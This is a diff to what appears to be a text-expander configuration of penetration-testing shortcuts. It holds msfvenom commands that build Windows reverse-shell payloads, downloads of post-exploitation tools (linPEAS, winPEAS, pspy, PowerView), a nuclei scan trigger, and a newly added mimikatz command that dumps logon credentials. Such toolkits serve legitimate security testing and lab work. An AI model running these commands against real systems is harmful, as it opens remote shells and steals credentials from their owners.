@@ -39,7 +39,8 @@ matches:
       msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell64.exe >/dev/null &
       msfvenom -p windows/powershell_reverse_tcp LHOST={{IP}} LPORT=443 -f psh >/dev/null &
       cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . & 
-      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh &  
+      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh &
+      wget -q https://github.com/peass-ng/PEASS-ng/releases/download/20240818-ea81ae32/winPEASany.exe -O winpeas.exe &
       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 &
       wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 &
@@ -131,7 +132,7 @@ matches:
     replace: "xfreerdp /dynamic-resolution /cert-ignore /compression /auto-reconnect /v:{{clipboard}} /u:user /p:pass "
 
   - trigger: ":nuclei"
-    replace: "nuclei -c 50 -retries 3 -u 192.168.189.156"
+    replace: "nuclei -c 50 -retries 3 -u {{clipboard}}"
 # REVERSE SHELLS                                                                
   # LINUX                                                                       
   - trigger: ":rcurl"                                                           
@@ -191,6 +192,9 @@ matches:
 
   - trigger: ":rligolo"
     replace: sudo ip route add 192.168.110.0/24 dev ligolo
+
+  - trigger: ":mimikatz"
+    replace: .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
 
 # EXPLOITS
 
